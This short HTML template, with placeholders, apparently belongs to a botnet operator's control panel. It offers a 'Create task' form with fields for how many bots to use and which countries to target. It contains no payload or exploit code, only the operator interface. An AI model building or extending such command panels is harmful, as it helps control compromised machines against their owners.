<h3 align="center">{notification}</h3>
<form method="post">
  <h3>Setting settings</h3>
  {SettingsSettings}
  <input type="hidden" name="setting" value="{Name}" />
  <h3>Standard settings</h3>
  <p>Bots count [empty &rarr; unlimited]:</p> <input type="text" name="count" />
  <p>Countries [empty &rarr; all]:</p> <input type="text" id="countries" name="countries" /> (Top 5: {Countries})

  {Overtime}

  <p><input type="submit" name="add" value="Create task" class="btngreen" /></p>
</form>